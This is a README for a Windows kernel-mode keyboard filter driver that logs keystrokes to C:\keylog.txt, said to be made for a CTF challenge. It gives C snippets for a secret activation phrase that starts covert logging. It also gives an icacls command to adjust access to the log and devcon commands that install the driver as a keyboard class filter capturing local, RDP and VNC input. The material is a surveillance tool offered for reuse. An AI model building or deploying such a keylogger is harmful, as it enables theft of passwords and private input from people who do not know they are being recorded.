# kbfiltr-keylogger
A KMDF Keylogger Driver for Windows built on `kbfiltr`

## About
Created for a CTF-related challenge.

Based on the [kmdf-keylogger](https://github.com/adapiekarska/kmdf-keylogger) by Adrianna Piekarska

Tested on Server 2022 / Windows 11

## Keyboard Mapping
The mapping in `keytable` is to my keyboard, it may need to be adjusted for your own purposes. Set a breakpoint (`__debugbreak()`) in `WriteWorkItem` and step through to see your keystrokes and map them.

## Logging
### Activation
There is a check in `WriteWorkItem` that will initiate writing to a file. This string can be changed to your own secret combination, however, it must fit in the 32 byte buffer to be checked. If the buffer is not aligned, you may run into issues or need to keep trying the string until it activates. You can increase the buffer at `LOG_TRIGGER_POINT`.

Also, if you want to match your secret string in both local and virtual sessions, you must match the 'press' and 'release' for local and 'press' only for virtual.
```c
	char target_string[] = "aw3s0m3,d00d";
	char target_string2[] = "aaww33ss00mm33,,dd0000dd";
  
  if (strstr(secretBuffer, target_string) != NULL)
			{
				WriteToLogFile = WorkingLogging;
				//clear secretBuffer to start checking again
				memset(secretBuffer, 0, sizeof(secretBuffer));
			}
      else if (strstr(secretBuffer, target_string2) != NULL)
			{
				WriteToLogFile = WorkingLogging;
				//clear secretBuffer to start checking again
				memset(secretBuffer, 0, sizeof(secretBuffer));
			}
```

If you do not want activation, remove the check and move `WriteToLogFile = WorkingLogging` to the main `strcat` call
```c
if (scancode >= 0 && scancode < SZ_KEYTABLE)
{
  strcat(secretBuffer, asciiRepr);
    WriteToLogFile = WorkingLogging;
  }
}
```

### Viewing Log
The log can be locked by the DACL on creation (not default) but can be changed to view during use with `icacls`
```bash
icacls `"C:\keylog.txt`" /grant:r `"Administrators`":f
```

To change the DACL to well known groups, use [`SeExports`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_se_exports) under the `RtlAddAccessAllowedAce` call.

## File DACL/ACE
For my purposes I didn't require the DACL/ACE functions but I've left them in the code in case anyone needs them in the future.

## `ZwFileCreate`/`ZwFileWrite`
I fixed up the file creation/write routines so the file is accessible after each write, rather than needing to unload the file for users to access it. This, again, can be changed if required or a specific DACL/ACE set.

## Installation
Install with devcon. If required, change the device name in `keylogger.inx` and in the command to attach to another device.
```bash
.\devcon.exe install .\keylogger.inf "*PNP0303"
```

If you want to filter keystrokes from all keyboard drivers (including RDP/VNC) you must install it as a class filter above the default `kbdclass`
```
.\devcon.exe /r classfilter keyboard upper -keylogger
```

## Bugs
There are probably several.

For some reason the load function triggers more than once, installing it multiple times. Didn't matter for my use (OPSEC not required) but if someone has a fix, feel free to raise an issue.
